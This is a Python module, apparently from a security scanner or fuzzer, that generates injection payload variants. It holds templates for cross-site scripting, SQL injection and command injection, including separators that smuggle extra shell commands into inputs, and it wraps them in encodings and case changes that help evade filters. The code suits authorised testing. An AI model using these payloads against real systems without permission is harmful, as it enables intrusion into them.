"""
Payload generators with encoding variations
"""

import urllib.parse
import base64
import html
from typing import List


class PayloadGenerator:
    """Generate encoded payload variants"""
    
    @staticmethod
    def generate_encoded(payload: str) -> List[str]:
        """Generate various encoded versions of payload"""
        variants = [payload]
        
        # URL encoding
        variants.append(urllib.parse.quote(payload))
        variants.append(urllib.parse.quote_plus(payload))
        
        # Double URL encoding
        variants.append(urllib.parse.quote(urllib.parse.quote(payload)))
        
        # HTML encoding
        variants.append(html.escape(payload))
        variants.append(payload.replace('<', '&lt;').replace('>', '&gt;'))
        
        # Base64 encoding
        try:
            variants.append(base64.b64encode(payload.encode()).decode())
        except:
            pass
        
        # Unicode encoding
        variants.append(''.join([f'\\u{ord(c):04x}' for c in payload]))
        
        # Mixed case
        variants.append(payload.swapcase())
        
        return list(set(variants))  # Remove duplicates
    
    @staticmethod
    def generate_context_specific(payload: str, context: str = 'html') -> List[str]:
        """Generate context-specific payloads"""
        if context == 'html':
            return [
                payload,
                f"<img src=x onerror={payload}>",
                f"<svg onload={payload}>",
                f"javascript:{payload}",
                f"onerror={payload}",
            ]
        elif context == 'sql':
            return [
                f"' OR {payload} --",
                f"' UNION {payload} --",
                f"1' AND {payload} --",
            ]
        elif context == 'command':
            return [
                f"; {payload}",
                f"| {payload}",
                f"& {payload}",
                f"`{payload}`",
                f"$({payload})",
            ]
        else:
            return [payload]
    
    @staticmethod
    def generate_fuzzing_patterns(base: str, variations: List[str]) -> List[str]:
        """Generate fuzzing patterns"""
        patterns = []
        
        for variation in variations:
            patterns.append(f"{base}{variation}")
            patterns.append(f"{variation}{base}")
            patterns.append(f"{variation}{base}{variation}")
        
        return patterns

